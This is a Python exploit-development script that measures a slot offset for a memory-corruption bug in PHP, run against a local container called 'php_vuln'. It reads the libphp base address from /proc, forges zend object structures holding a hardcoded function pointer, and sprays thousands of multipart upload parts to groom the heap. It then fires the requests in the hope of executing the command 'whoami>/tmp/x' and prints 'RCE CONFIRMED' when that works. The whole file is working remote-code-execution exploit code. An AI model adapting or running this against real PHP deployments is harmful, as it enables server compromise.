#!/usr/bin/env python3
"""oom106: MEASURE the walked slot offset X empirically.

All 99-105 aims were inference-fitted to silences. With every offset
class covered by legal self-typing pointers (oom105 grid=6, BOFF=670),
a silent 200 remains -> the walked slot's TYPE byte must be poisoned
by the block head (X in {BOFF-8, BOFF-16} -> ti=0x01080001=IS_REFERENCE
-> clean skip) OR X lies elsewhere entirely.

Method: plant legal OBJ pointers ONLY at a candidate window W (8 slots
wide); filler elsewhere. Same-shape fires. Crash at fire => X in W
(and the OBJ chain armed). No crash => next candidate. One crash per
boot (worker dies) -> after crash, re-warm+re-probe (fork layout is
stable across worker respawns: VAs repeat, so candidate ordering stays
meaningful).

Candidates (hypothesis order): block-tail first (654, 662 for BOFF=670
geometry => use BOFF=670 fixed block; windows descending), then 470-486
(98g-era), then mid-tile.
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537
BOFF = 1000          # block FAR from all candidate windows

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)

def build_tile(OBJ, x0, x1):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)
    B[0x58:0x5C] = struct.pack("<I", 6)
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(MAXT)
    for off in range(0, BOFF - 8, 8):
        T[off:off + 8] = b"A" * 7 + b"A"      # filler (0x41s)
    for off in range(x0, x1, 8):              # candidate window only
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    return bytes(T)

def probe_copies(needle, maxc=12):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_obj(offs):
    for V in offs:
        for b in range(BOFF, MAXT - TILE):
            x = V + b
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return V, x, b
    return None, None, None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

def crashed():
    """worker died -> connection refused/reset on next probe"""
    code, _ = post(b"")
    return code == "ERR"

# candidate windows (offsets in the p0 value tile), hypothesis order
WINDOWS = [(646, 654), (654, 662), (662, 670),      # block-tail zone
           (470, 486), (440, 470), (380, 440),      # 98g-era zone
           (100, 380), (0, 100)]                    # everything else

WARM = aim_body((b"WARMUPX" * 192 + b"W" * 400)[:1537])

for w0, w1 in WINDOWS:
    OUT("-- window %d..%d --" % (w0, w1))
    for i in range(12):
        post(WARM)
    offs = probe_copies(b"WARMUPX" * 24, maxc=12)
    if not offs:
        OUT("    probe dead, skip window")
        continue
    V, OBJ, boff = find_obj(offs)
    OUT("    V=%s OBJ=%s BOFF=%d" % (hex(V) if V else None,
        hex(OBJ) if OBJ else None, boff))
    if not OBJ:
        continue
    tile = build_tile(OBJ, w0, w1)
    body = aim_body(tile)
    code, resp = post(body)                # plant (bailout walks warm tile)
    OUT("    plant: %s" % code)
    if check_x("plant w%d" % w0):
        raise SystemExit("*** RCE CONFIRMED (plant, X~%d) ***" % w0)
    for fi in range(3):
        code, resp = post(body)            # fire (walks OWN just-planted tile)
        OUT("    fire%d: %s" % (fi, code))
        if check_x("fire%d w%d" % (fi, w0)):
            raise SystemExit("*** RCE CONFIRMED (X~%d) ***" % w0)
        if code == "ERR":
            OUT("    (worker crashed -> X CANDIDATE %d..%d STRONG)" % (w0, w1))
            time.sleep(4)
            break
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
